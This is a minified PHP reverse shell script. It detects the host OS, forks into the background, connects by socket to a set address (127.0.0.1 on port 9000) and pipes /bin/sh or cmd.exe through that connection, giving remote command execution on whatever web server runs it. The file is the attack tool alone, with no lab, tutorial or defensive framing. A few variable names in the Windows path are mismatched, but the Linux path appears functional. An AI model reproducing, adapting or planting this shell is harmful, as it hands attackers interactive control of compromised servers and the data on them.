<?php class Sh{var $a=null;var $p=null;var $os=null;var $sh=null;var $des=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));var $b=1024;var $c=0;var $e=false;function Sh($a,$p){$this->a=$a;$this->p=$p;}function det(){$d=true;if(strpos(strtoupper(PHP_OS),'LINUX')!==false){$this->os='LINUX';$this->sh='/bin/sh';}else if(strpos(strtoupper(PHP_OS),'WIN32')!==false||strpos(strtoupper(PHP_OS),'WINNT')!==false||strpos(strtoupper(PHP_OS),'WINDOWS')!==false){$this->os='WINDOWS';$this->sh='cmd.exe';}else{$d=false;echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";}return $d;}function daem(){$e=false;if(!function_exists('pcntl_fork')){echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";}else if(($pid=@pcntl_fork())<0){echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";}else if($pid>0){$e=true;echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";}else if(posix_setsid()<0){echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";}else{echo "DAEMONIZE: Completed successfully!\n";}return $e;}function set(){@error_reporting(0);@set_time_limit(0);@umask(0);}function d($d){$d=str_replace('<','&lt;',$d);$d=str_replace('>','&gt;',$d);echo $d;}function r($s,$n,$b){if(($d=@fread($s,$b))===false){$this->e=true;echo"STRM_ERROR: Cannot read from {$n}, script will now exit...\n";}return $d;}function w($s,$n,$d){if(($by=@fwrite($s,$d))===false){$this->e=true;echo"STRM_ERROR: Cannot write to {$n}, script will now exit...\n";}return $by;}function rw($i,$o,$in,$on){while(($d=$this->r($i,$in,$this->b))&&$this->w($o,$on,$d)){if($this->os==='WINDOWS'&&$on==='STDIN'){$this->c+=strlen($d);}$this->d($d);}}function brw($i,$o,$in,$on){$f=fstat($input);$s=$f['size'];if($this->os==='WINDOWS'&&$in==='STDOUT'&&$this->c){while($this->c>0&&($by=$this->c>=$this->b?$this->b:$this->c)&&$this->r($i,$in,$by)){$this->c-=$by;$s-=$by;}}while($s>0&&($by=$s>=$this->b?$this->b:$s)&&($d=$this->r($i,$in,$by))&&$this->w($o,$on,$d)){$s-=$by;$this->d($d);}}function rn(){if($this->det()&&!$this->daem()){$this->set();$soc=@fsockopen($this->a,$this->p,$ern,$ers,30);if(!$soc){echo"SOC_ERROR: {$ern}: {$ers}\n";}else{stream_set_blocking($soc,false);$proc=@proc_open($this->sh,$this->des,$ps);if(!$proc){echo "PROC_ERROR: Cannot start the shell\n";}else{foreach($ps as $p){stream_set_blocking($p,false);}@fwrite($soc,"SOCKET: Shell has connected!\n");do{if(feof($soc)){echo "SOC_ERROR: Shell connection has been terminated\n";break;}else if(feof($ps[1])){echo "PROC_ERROR: Shell process has been terminated\n";break;}$s=array('read'=>array($soc,$ps[1],$ps[2]),'write'=>null,'except'=>null);$ncs=@stream_select($s['read'],$s['write'],$s['except'],0);if($ncs===false){echo "STRM_ERROR: stream_select() failed\n";break;}else if($ncs>0){if($this->os==='LINUX'){if(in_array($soc,$s['read'])){$this->rw($soc,$ps[0],'SOCKET','STDIN');}if(in_array($ps[2],$s['read'])){$this->rw($ps[2],$soc,'STDERR','SOCKET');}if(in_array($ps[1],$s['read'])){$this->rw($ps[1],$soc,'STDOUT','SOCKET');}}else if($this->os==='WINDOWS'){if(in_array($soc,$s['read'])){$this->rw($soc,$ps[0],'SOCKET','STDIN');}if(($f=fstat($pipes[2]))&&$f['size']){$this->brw($ps[2],$soc,'STDERR','SOCKET');}if(($f=fstat($pipes[1]))&&$f['size']){$this->brw($ps[1],$soc,'STDOUT','SOCKET');}}}}while(!$this->e);foreach($ps as $p){fclose($p);}proc_close($proc);}fclose($soc);}}}}echo '<pre>';$sh=new Sh('127.0.0.1',9000);$sh->rn();unset($sh);echo '</pre>'; ?>
